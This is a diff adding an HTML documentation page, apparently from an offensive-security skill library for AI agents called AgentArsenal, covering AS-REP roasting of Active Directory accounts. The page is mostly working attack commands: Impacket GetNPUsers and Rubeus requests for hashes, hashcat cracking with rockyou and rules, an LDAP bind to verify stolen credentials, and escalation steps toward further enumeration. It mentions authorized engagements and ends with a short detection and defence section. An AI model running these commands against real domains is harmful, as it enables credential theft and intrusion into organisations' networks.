@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: asrep-roast-execution</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>asrep-roast-execution</h2><div class="meta"><span class="badge gray">ad</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when hunting Active Directory accounts with Kerberos</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="kerberoasting.html">kerberoasting</a></div><div class="deps"><span class="kind">requires:</span> <a href="kerberoasting.html">kerberoasting</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="ad-enumeration.html">ad-enumeration</a> <a href="password-attacks.html">password-attacks</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Impacket</td><td>0.11.0</td></tr><tr><td>Hashcat</td><td>6.2.6</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>AS-REP roasting needs no credentials at all: accounts with Kerberos pre-authentication disabled hand you a crackable hash in response to a single request. It is the best pre-authentication attack in AD and often the first foothold. This skill covers finding those accounts and roasting them on authorized engagements, from discovery through cracking to the first authenticated steps.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Build or confirm the username list (see kerberos-enum).</li>
+<li>Request AS-REP hashes for the list without authenticating.</li>
+<li>Collect the hashes in Hashcat format ($krb5asrep$).</li>
+<li>Crack with targeted wordlists and rules first.</li>
+<li>Verify each cracked credential with a real bind.</li>
+<li>Use the foothold to start authenticated enumeration.</li>
+<li>Report the misconfigured accounts individually.</li>
+</ol>
+<h2>1. Finding and roasting</h2>
+<pre><code class="language-bash"># GetNPUsers: no credentials needed, outputs Hashcat-ready hashes
+python3 /opt/impacket/examples/GetNPUsers.py corp.example/ \
+  -dc-ip 10.0.5.10 -usersfile /tmp/valid_users.txt \
+  -format hashcat -outputfile /tmp/asrep.txt
+cat /tmp/asrep.txt
+
+# Single user test when you suspect one account
+python3 /opt/impacket/examples/GetNPUsers.py corp.example/ \
+  -dc-ip 10.0.5.10 -usersfile /tmp/one_user.txt -format hashcat</code></pre>
+<pre><code class="language-powershell"># Rubeus equivalent on Windows
+Rubeus.exe asreproast /user:testuser /outfile:C:\temp\asrep.txt</code></pre>
+<p>Every hash in the output is an account the domain misconfigured. There is no noise-versus-signal judgment here: pre-auth disabled is always a finding, whether or not the hash cracks.</p>
+<h2>2. Cracking and verifying</h2>
+<pre><code class="language-bash"># Hashcat mode 18200 = Kerberos 5 AS-REP
+hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule -o /tmp/asrep_cracked.txt --status
+
+# These accounts often have weak passwords (that is why pre-auth was
+# disabled for some legacy need); targeted lists work well
+hashcat -m 18200 /tmp/asrep.txt /tmp/targeted.txt -o /tmp/asrep_cracked2.txt
+
+# Verify immediately: bind as the cracked user
+python3 /opt/impacket/examples/ldapsearch.py \
+  corp.example/testuser:&#x27;CrackedPass!&#x27; -dc-ip 10.0.5.10 \
+  -request &quot;(objectClass=user)&quot; -attributes sAMAccountName 2&gt;&amp;1 | head -5</code></pre>
+<p>A cracked AS-REP account is a full domain user credential: it unlocks authenticated LDAP, SMB, and the kerberoast-execution phase. Treat it as the foothold it is and move fast but carefully.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>No accounts have pre-auth disabled. The domain is configured</li>
+<p>correctly here; note the negative result and move to other foothold techniques.</p>
+<li>The hash cracks but the account is disabled or expired. Still a</li>
+<p>finding about the configuration, but not a foothold; report both facts.</p>
+<li>GetNPUsers returns errors for every user. Check the DC address, the</li>
+<p>domain name spelling, and network reachability to port 88 before concluding anything.</p>
+<li>The account needs pre-auth for a reason (legacy system). Note the</li>
+<p>business reason if the client states one, but the risk stands until the account is fixed or isolated.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>The cracked account has interesting group membership: escalate to</li>
+<p>full authenticated enumeration (ldap-enumeration) immediately.</p>
+<li>Nothing cracks: keep the hashes; longer wordlist runs can continue</li>
+<p>in the background while the engagement proceeds elsewhere.</p>
+<li>You need more usernames to test: return to kerberos-enum for a wider</li>
+<p>validated list.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see AS-REP roasting as AS-REQ packets without pre-authentication data, which normal clients never send. It is one of the easiest attacks to detect at the KDC. The defense is absolute: enable Kerberos pre-authentication on every account with no exceptions, and alert on any pre-auth-less AS-REQ as an attack in progress. There is no legitimate reason for the pattern in modern environments.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1558.004 (Steal or Forge Kerberos Tickets: AS-REP</li>
+<p>Roasting).</p>
+<li>CWE-287 (Improper Authentication).</li>
+<li>Impacket GetNPUsers documentation.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
